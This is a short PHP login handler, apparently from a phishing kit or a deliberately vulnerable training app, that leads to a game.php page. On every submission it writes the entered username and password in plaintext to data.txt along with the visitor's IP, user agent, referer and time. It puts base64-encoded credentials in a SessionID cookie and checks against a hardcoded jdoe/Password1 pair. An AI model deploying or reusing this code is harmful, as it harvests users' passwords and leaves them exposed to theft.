<?php
$ip = getenv ('REMOTE_ADDR');
$date=date("j F, Y, g:i a");;
$referer=getenv ('HTTP_REFERER');
$agent=getenv ('HTTP_USER_AGENT');
$fp = fopen('data.txt', 'a');
fwrite($fp, '****Credentials: ' .$_POST["login"]. ' ' .$_POST["password"]. ' Agent: ' .$agent. ' IP: ' .$ip. ' Date and Time: ' .$date. ' Referer: '.$referer."\n");
fclose($fp);

$login = $_POST["login"];
$password = $_POST["password"];
$login = base64_encode($login.':'.$password);

setcookie("SessionID", $login);

if ( $_POST["login"] == "jdoe" && $_POST["password"] == "Password1") {

header('Location: game.php');

echo '
<html>
<body>
<center>
Success!!!!
</center>
</body>
</html>';
} else {
echo '
<html>
<head>
   <link rel="stylesheet" href="./_css/main.css">
</head>
<body>
<center>
<br><br><br>
<h1>Error</h1>
Incorrect Password.
<br>Click <a href="./login.php">here</a> to try again
</center>
</body>
</html>';
}
?>
